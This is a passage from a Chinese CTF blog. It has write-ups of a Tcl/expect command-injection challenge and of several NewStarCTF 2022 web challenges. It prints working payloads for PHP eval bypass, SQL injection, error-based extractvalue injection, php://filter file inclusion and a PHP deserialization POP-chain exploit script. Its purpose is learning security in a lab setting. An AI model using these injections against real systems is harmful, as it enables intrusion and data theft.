<p><code>&quot;/app/ezjava/runexpect.sh /app/ezjava/expect/ expect /app/ezjava/call.sh 1 &quot;+command</code></p>
<p>“<a class="link"   href="http://runexpect.sh/" >runexpect.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>”：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">\#!/bin/sh</span><br><span class="line"></span><br><span class="line">\# Set LD_LIBRARY_PATH</span><br><span class="line"></span><br><span class="line">export LD_LIBRARY_PATH=$1</span><br><span class="line"></span><br><span class="line">echo &quot;Assuming LD_LIBRARY_PATH in runexpect :&quot; $LD_LIBRARY_PATH</span><br><span class="line"></span><br><span class="line">shift</span><br><span class="line"></span><br><span class="line">echo &quot;Running command: $*&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">*</span></span><br><span class="line"></span><br><span class="line">exit $?</span><br></pre></td></tr></table></figure></div>

<p>“<a class="link"   href="http://call.sh/" >call.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>”：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">\#!/usr/bin/tclsh</span><br><span class="line"></span><br><span class="line">set password [lindex $argv 0]</span><br><span class="line"></span><br><span class="line">set host [lindex $argv 1]</span><br><span class="line"></span><br><span class="line">set port [lindex $argv 2]</span><br><span class="line"></span><br><span class="line">set dir [lindex $argv 3]</span><br><span class="line"></span><br><span class="line">puts $argv</span><br><span class="line"></span><br><span class="line">eval spawn ssh -p $port $host test -d $dir &amp;&amp; echo exists</span><br><span class="line"></span><br><span class="line">expect &quot;*(yes/no*)?*$&quot; &#123; send &quot;yes\n&quot; &#125;</span><br><span class="line"></span><br><span class="line">set timeout 600</span><br><span class="line"></span><br><span class="line">expect &quot;*assword:*$&quot; &#123; send &quot;$password\n&quot; &#125; \</span><br><span class="line"></span><br><span class="line">timeout &#123; exit 1 &#125;</span><br><span class="line"></span><br><span class="line">set timeout -1</span><br><span class="line"></span><br><span class="line">expect &quot;\\$ $&quot;</span><br></pre></td></tr></table></figure></div>

<p>command 是被传入的可控字符串参数，对应 <code>call.sh</code> 中的 <code>$host, $port, $dir</code> 参数。目的是注入恶意指令到以下语句：</p>
<p><code>eval spawn ssh -p $port $host test -d $dir &amp;&amp; echo exists</code></p>
<p>如果直接调用 “<a class="link"   href="http://call.sh/" >call.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>” 进行注入，则任意选一个参数，写一个内联语句就行，例如给 <code>$host</code> 传一个：<code>[exec cat /flag &gt; /dev/...]</code></p>
<p>但是原题利用另一个脚本 “<a class="link"   href="http://runexpect.sh/" >runexpect.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>” 间接调用 “<a class="link"   href="http://call.sh/" >call.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>”，导致无法传入有效的空格，因此需要转换思路，参考上面 <code>system</code> 的用法，利用三个参数构造如下语句：</p>
<p><code>[system echo test -d &#39;`cat&lt;/flag&gt;/dev/...`&#39;|bash]</code></p>
<p><code>echo</code> 命令会输出 <code>test -d `cat&lt;/flag&gt;/dev/...` </code> 交给 bash 解析，反引号会自动执行其中的内容，达成恶意命令注入的效果。反引号中也可以用制表符 <code>\t</code> 代替空格：</p>
<p><code>[system echo test -d &#39;`cat\t&lt;\t/flag&gt;/dev/...`&#39;|bash]</code></p>
<hr>
<p>感兴趣的可以试试，欢迎讨论其他做法</p>
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>NewStarCTF 2022</title>
    <url>/2022/10/18/Security/CTF/NewStarCTF%202022/</url>
    <content><![CDATA[<h2 id="WEB-Week1"><a href="#WEB-Week1" class="headerlink" title="WEB-Week1"></a>WEB-Week1</h2><h3 id="我真的会谢"><a href="#我真的会谢" class="headerlink" title="我真的会谢"></a>我真的会谢</h3><p>提示：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag has three part, qsdz hid them in different files.</span><br><span class="line">By the way, these files are sensitive.</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--I used VIM to write this file, but some errors occurred midway.--&gt;</span><br></pre></td></tr></table></figure></div>

<p>三段flag藏在三个敏感文件中，有一个是VIM意外退出生成的 <code>.?.swp</code> 文件，由于是网页文件，猜测文件为：”.index.php.swp”。得到第二段flag为”0_e4sy_d0_y00”</p>
<p>备份敏感文件robots.txt中藏有第一段flag”flag{Th1s_Is_s00”，网页的常用文件<a href="http://www.zip中藏有第三段flag："u_th1nk_so?}">www.zip中藏有第三段flag：&quot;u_th1nk_so?}</a>“</p>
<p>本来想扫描的，看了<a class="link"   href="https://blog.csdn.net/weixin_46497491/article/details/126960995" >wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>就直接得到文件了</p>
<h3 id="NotPHP"><a href="#NotPHP" class="headerlink" title="NotPHP"></a>NotPHP</h3><p>一道php绕过，源码如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先需要GET方式传入data，通过file_get_contents(data)函数访问一个文件内容且该内容恰好为”Weilcome to CTF”。借助data伪协议可以将文件流替换为输入流，构造 <code>/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=</code> 其中”V2VsY29tZSB0byBDVEY&#x3D;”是”Welcome to CTF”的base64编码</p>
<p>接着需要构造key1和key2以满足两者的md5编码结果能通过”===“测试且key1和key2的值能通过”!==“测试，要求两者内容不同但md5相同实际上是要求一个md5碰撞，但还有更简单的方法，由于php的 <code>md5()</code> 函数无法处理数组，一律返回null，因此只需要传入数组即可通过”===“测试：<code>key1[]=1&amp;key2[]=2</code></p>
<p>接着来到第三层检测，<code>is_numberic()</code> 函数检测变量是否为数字或数字字符串，浮点型也可返回true；<code>intval()</code> 获取变量的整数值；因此需要用post方式传入num变量使得它不是一个数字的同时将其转化为数字又等于2077。payload：<code>num=2077a</code> 。转化为数字时取开头连续的数字为2077，判断类型时由于a的存在被判断为非数字字符串。（好像有点简单233）十六进制 <code>num=0x81D</code> 无法绕过是因为字符串”0x81D”被认为是数字字符串</p>
<p>然后可以传入cmd参数进行命令执行，但是前面连接了一个注释符，因此需要绕过，可以使用换行符 <code>%0a</code> 换行绕过：<code>cmd=%0asystem(&#39;cat /flag&#39;);</code> 即可得到flag。或者使用 <code>?&gt;</code> 的闭合也可以绕过：<code>cmd=?&gt;&lt;?php system(&#39;cat /flag&#39;);</code> (<code>eval()</code> 函数中”?&gt;”的神奇效果，好像是直接将其插入到php文件中一样)</p>
<p>因此最终的payload：<code>http://de68bddc-7ec1-4ca7-b9d8-0eb85578a5e4.node4.buuoj.cn:81/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&amp;key1[]=1&amp;key2[]=2&amp;cmd=?&gt;&lt;?php system(&#39;cat /flag&#39;);</code> +POST内容：<code>num=2077a</code></p>
<p>参考：[</p>
<p><a class="link"   href="https://blog.csdn.net/qq_53142368/article/details/116594299" >PHP伪协议 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/djkl/p/16778392.html" >DjkL-WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>]</p>
<h3 id="Word-For-You"><a href="#Word-For-You" class="headerlink" title="Word-For-You"></a>Word-For-You</h3><p>一道简单的SQL注入，就是有点迷惑性，先试试是不是数字型：<code>1 or 1=1</code> ，回显无任何内容，且1 or 1&#x3D;1被原样作为用户名打了出来，看上去很奇怪。再尝试字符型： <code>1&#39;</code> 发现没有报错，且 <code>1&#39;</code> 也被原样打了出来，我起初以为它做了严格的防sql的防火墙，后来发现它只是把输出原样打到了屏幕上。</p>
<p>payload：<code>1&#39; or &#39;1</code> 即可将数据库中所有留言都显示出来，其中就有flag。实际上注入是有效的，但是由于回显只是简单的将搜索结果和输入内容输出，若注入语句查询不到任何东西则回显内容也是空的，有一定欺骗性，因此看起来像是无法注入。</p>
<h2 id="WEB-Week2"><a href="#WEB-Week2" class="headerlink" title="WEB-Week2"></a>WEB-Week2</h2><h3 id="Word-For-You-1"><a href="#Word-For-You-1" class="headerlink" title="Word-For-You"></a>Word-For-You</h3><p>由于调试信息回显了出来，因此是一道报错注入，本题查询成功时不再回显查询结果</p>
<p>先注入库名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>wfy<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>再注入表名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>wfy<span class="string">&#x27;),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>wfy_admin,wfy_comments,wfy_info<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>猜测在’wfy_comments’中，注入列名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>wfy_comments<span class="string">&#x27;),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>id,text,<span class="keyword">user</span>,name,display<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>评论应该在text中，注入text列：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select text from wfy_comments limit 11,1),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>flag&#123;Ju4t_m2ke_some_err0rs&#125;<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>由于评论不止一条，使用”limit 11,1”获取第十一条就是flag。也可以使用”group_concat()”函数将所有评论连接起来，但是由于报错回显的长度有限，并不能将所有内容输出，这时候还可以用”MID()”函数提取字符串部分的方式寻找并取得flag。</p>
<h3 id="Include-One"><a href="#Include-One" class="headerlink" title="Include One"></a>Include One</h3><p>题目源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;seed.php&quot;</span>);</span><br><span class="line"><span class="comment">//mt_srand(*********);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//flag in `flag.php`</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Baby Hacker?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No Hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>随机数种子的破解工具：<a class="link"   href="https://www.openwall.com/php_mt_seed/" >php mt_srand()碰撞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>先破解随机数，post传入 <code>guess=1202031004</code> ，下方的正则过滤了”base”与”..&#x2F;“，并要求必须出现”NewStar”，提示flag在”flag.php”中，由于flag存储在php文件中，直接读取可能会化为源码隐藏起来，因此读取时需要字符转化来绕过 <code>&lt;?php</code> ，使用php的filter协议中的 <code>string.rot13</code> 来绕过即可，payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/NewStar/read=string.rot13/resource=flag.php</span><br></pre></td></tr></table></figure></div>

<p> 这里用不上目录穿越，flag.php就在工作目录下，也不在”NewStar”中。最终读取到的flag形式：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--?cuc //synt&#123;8o8q8p5n-1441-4890-o2r7-s02s9n44586s&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line">-&gt; flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125;</span><br></pre></td></tr></table></figure></div>

<p>不知道flag.php如何编写才能有这种效果，若flag.php内容如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125;</span></span><br><span class="line"></span><br><span class="line">-&gt;Parse error: syntax error, unexpected end of file in F:\phpstudy_pro\WWW\flag.php on line <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>会出现报错，改成如下内容：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125; ?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>访问flag.php：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=string.rot13/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">-&gt; Warning: Use of undefined constant cuc - assumed <span class="string">&#x27;cuc&#x27;</span> (this will <span class="keyword">throw</span> an <span class="built_in">Error</span> in a future version of PHP) in F:\phpstudy_pro\WWW\flag.php on line <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>最终无法以html注释的形式获得flag。改成如下内容：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--?php <span class="comment">//flag&#123;8b8d8c5a-1441-4890-b2e7-f02f9a44586f&#125;</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p>则不需要rot13也能直接读取到flag。不知道怎么出题！</p>
<p>参考：[</p>
<p><a class="link"   href="https://www.freebuf.com/articles/web/266565.html" >php伪协议绕过 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,</p>
<p><a class="link"   href="https://www.php.net/manual/zh/filters.php" >php过滤器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,</p>
<p>]</p>
<h3 id="UnserializeOne"><a href="#UnserializeOne" class="headerlink" title="UnserializeOne"></a>UnserializeOne</h3><p>源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注释掉 <code>error_reporting(0);</code> 可查看报错</p>
<p>反序列化链：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Start</span>::<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">-&gt;<span class="title class_">Sec</span>::<span class="title function_ invoke__">__toString</span>()</span><br><span class="line">-&gt;<span class="title class_">Easy</span>::<span class="title function_ invoke__">__call</span>()</span><br><span class="line">-&gt;eeee::<span class="title function_ invoke__">__clone</span>()</span><br><span class="line">-&gt;<span class="title class_">Start</span>::<span class="title function_ invoke__">__isset</span>()</span><br><span class="line">-&gt;<span class="title class_">Sec</span>::<span class="title function_ invoke__">__invoke</span>()</span><br><span class="line">-&gt;<span class="title function_ invoke__">getFlag</span>()</span><br></pre></td></tr></table></figure></div>

<p>exp：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg1</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;obj=<span class="variable">$var</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg2</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>=<span class="variable">$var</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$func</span>;	<span class="comment">// 全部改成public</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;func=<span class="variable">$var</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sta1</span>=<span class="keyword">new</span> <span class="title class_">Start</span>;</span><br><span class="line"><span class="variable">$sec1</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>;	</span><br><span class="line"><span class="variable">$eas1</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>;</span><br><span class="line"><span class="variable">$eee1</span>=<span class="keyword">new</span> eeee;</span><br><span class="line"><span class="comment"># $sta2=new Start;	// 若有多个Start，将多次调用析构函数出现问题</span></span><br><span class="line"><span class="comment"># $sec2=new Sec;	// 多个Sec没有关系，但一个够用了</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sta1</span>-&gt;<span class="title function_ invoke__">chg</span>(<span class="variable">$sec1</span>);	<span class="comment">// 修改保护属性func</span></span><br><span class="line"><span class="variable">$eee1</span>-&gt;obj=<span class="variable">$sta1</span>;</span><br><span class="line"><span class="variable">$sec1</span>-&gt;<span class="title function_ invoke__">chg1</span>(<span class="variable">$eas1</span>);	<span class="comment">// 私有属性不能直接更改</span></span><br><span class="line"><span class="variable">$sec1</span>-&gt;<span class="title function_ invoke__">chg2</span>(<span class="variable">$eee1</span>);	<span class="comment">// 借助公共函数进行修改</span></span><br><span class="line"><span class="variable">$sta1</span>-&gt;name=<span class="variable">$sec1</span>;</span><br><span class="line"><span class="variable">$serl</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$sta1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serl</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;serialize.txt&#x27;</span>, <span class="variable">$serl</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>写了好久的exp，反序列化时 <code>__toString()</code> 附近一直报错，问题出在两个地方：</p>
<ol>
<li>按照源码我构造序列化时，Sec类的成员函数都为私有，这会使得序列化内容与public略有不同，反序列化时读取不进去。<strong>全部改成public就解决了。</strong></li>
<li>构造链子时创建了两个Start类，析构函数调用了两次，出现了问题。<strong>本题一个就够用了，新建一个Start还需要考虑 <code>__toString</code> 的合法性。</strong></li>
</ol>
<p>未解决的问题：</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 为什么反序列化一经执行就立刻调用析构函数？<br>&#x3D;&gt; <strong>猜测：</strong> 反序列化的内容没有被存入任何变量中，反序列化得到的对象生命周期立刻就结束了，因此直接调用析构函数</li>
<li><input checked="" disabled="" type="checkbox"> <code>file_put_contents()</code> 写入序列化内容时（无中文）为什么出现乱码？<br>&#x3D;&gt; 出现乱码时序列化了”protected”属性，该类属性在序列化中会产生一些特殊字符，导致编码出现了一些问题。</li>
</ul>
<p>所得flag：flag{db75c88a-6713-4f3e-93f0-22f44dc70b93}</p>
<p>参考：[</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/377676274" >php反序列化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>]</p>
